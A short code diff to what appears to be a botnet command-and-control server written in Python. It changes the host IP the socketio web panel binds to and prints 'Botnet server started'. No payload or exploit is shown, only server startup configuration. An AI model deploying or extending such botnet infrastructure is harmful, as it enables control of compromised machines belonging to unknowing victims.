@@ -945,6 +945,6 @@ if __name__ == '__main__':
 		threading.Thread(target=last_online).start() ; threading.Thread(target=map_update).start()
 		if _bind((ippp, port)): print_debug(f'Botnet server started on {ippp}:{port}')
 		pppp = "1666" ; pp = int(pppp) # HOSTPORTHERE
-		socketio.run(app.run(host="192.168.0.2", port=pp)) # HOSTIPHERE
+		socketio.run(app.run(host="192.168.87.28", port=pp)) # HOSTIPHERE
 
 	else: print("This program is only compatible with Windows") ; os._exit(1)
